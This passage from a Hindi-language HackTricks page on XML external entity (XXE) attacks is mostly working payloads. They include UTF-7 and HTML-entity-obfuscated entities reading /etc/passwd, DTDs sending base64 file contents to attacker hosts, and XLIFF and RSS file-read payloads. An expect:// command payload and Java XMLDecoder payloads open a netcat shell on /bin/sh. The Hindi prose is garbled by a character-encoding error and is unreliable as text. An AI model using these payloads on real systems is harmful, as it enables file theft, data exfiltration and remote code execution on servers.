<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ Protocol Bypass

рдпрджрд┐ рд╡реЗрдм PHP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ `file:/` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп рдЖрдк **php wrappers** `php://filter/convert.base64-encode/resource=` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЖрдВрддрд░рд┐рдХ рдлрд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪ** рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рд╡реЗрдм Java рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol) рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### HTML Entities

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes) рд╕реЗ рдЯреНрд░рд┐рдХ\
рдЖрдк **html entities** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **entity рдХреЗ рдЕрдВрджрд░ рдПрдХ entity** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ **dtd рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрд▓** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП **HTML Entities** рдХреЛ **numeric** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдЬреИрд╕реЗ \[рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD рдЙрджрд╛рд╣рд░рдг:
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**рдирд┐рдХрд╛рд▓реЗрдВ** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рдирд┐рдХрд╛рд▓реЗрдВ**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### рд░рд┐рдореЛрдЯ рдХреЛрдб рдПрдХреНрдЬреАрдХреНрдпреВрд╢рди

**рдпрджрд┐ PHP "expect" рдореЙрдбреНрдпреВрд▓ рд▓реЛрдбреЗрдб рд╣реИ**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

рдпрд╣ рдЕрдиреБрднрд╛рдЧ [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe) рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ\
[Wikipedia](https://en.wikipedia.org/wiki/XLIFF) рдХреЗ рдЕрдиреБрд╕рд╛рд░:

> XLIFF (XML Localization Interchange File Format) рдПрдХ XML-рдЖрдзрд╛рд░рд┐рдд рдмрд┐рдЯреЗрдХреНрд╕реНрдЯ рдкреНрд░рд╛рд░реВрдк рд╣реИ рдЬрд┐рд╕реЗ рд╕реНрдерд╛рдиреАрдпрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдФрд░ рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рдмреАрдЪ рд╕реНрдерд╛рдиреАрдпрдХрд░рдг рдбреЗрдЯрд╛ рдХреЛ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдХреЛ рдорд╛рдирдХреАрдХреГрдд рдХрд░рдиреЗ рдФрд░ CAT рдЯреВрд▓ рдПрдХреНрд╕рдЪреЗрдВрдЬ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдкреНрд░рд╛рд░реВрдк рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред

### Blind request
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
рд╕рд░реНрд╡рд░ рдПрдХ рддреНрд░реБрдЯрд┐ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ:
```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
рд▓реЗрдХрд┐рди рд╣рдореЗрдВ Burp Collaborator рдкрд░ рдПрдХ рд╣рд┐рдЯ рдорд┐рд▓реАред

### рдЖрдЙрдЯ рдСрдл рдмреИрдВрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
### рдПрд░рд░ рдЖрдзрд╛рд░рд┐рдд рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдирд╛

DTD рдлрд╛рдЗрд▓:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
рд╕рд░реНрд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛! `non-exist` рдлрд╝рд╛рдЗрд▓ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢реЛрдВ рдореЗрдВ рдкрд░рд┐рд▓рдХреНрд╖рд┐рдд рд╣реЛрддреА рд╣реИред рдЕрдЧрд▓рд╛ рдХрджрдо рд╣реИ рдлрд╝рд╛рдЗрд▓ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЬреЛрдбрд╝рдирд╛ред

DTD рдлрд╝рд╛рдЗрд▓:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
рдФрд░ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ **HTTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреА рдЧрдИ рддреНрд░реБрдЯрд┐ рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рдкреНрд░рд┐рдВрдЯ рдХреА рдЧрдИ рдереА**ред

## RSS - XEE

XXE рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп XML рдЬрд┐рд╕рдХрд╛ рдкреНрд░рд╛рд░реВрдк RSS рд╣реИред

### рдкрд┐рдВрдЧ рдмреИрдХ

рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд░реНрд╡рд░ рдкрд░ рд╕рд╛рдзрд╛рд░рдг HTTP рдЕрдиреБрд░реЛрдз
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### рдлрд╛рдЗрд▓ рдкрдврд╝реЗрдВ
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### рд╕реЛрд░реНрд╕ рдХреЛрдб рдкрдврд╝реЗрдВ

PHP base64 рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE рд╕реЗ RCE рддрдХ

XMLDecoder рдПрдХ Java рдХреНрд▓рд╛рд╕ рд╣реИ рдЬреЛ XML рд╕рдВрджреЗрд╢ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдмрдирд╛рддреА рд╣реИред рдпрджрд┐ рдХреЛрдИ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ **readObject** рдореЗрдердб рдореЗрдВ рдордирдорд╛рдиреЗ рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рддреБрд░рдВрдд рд╕рд░реНрд╡рд░ рдкрд░ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд▓реЗрдЧрд╛ред

### Runtime().exec() рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## рдЙрдкрдХрд░рдг

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## рдЕрдзрд┐рдХ рд╕рдВрд╕рд╛рдзрди

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
рдЕрдкрдиреЗ рдмрд╛рд╣рд░реА DTD рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ HTTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реЗрдВ: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>
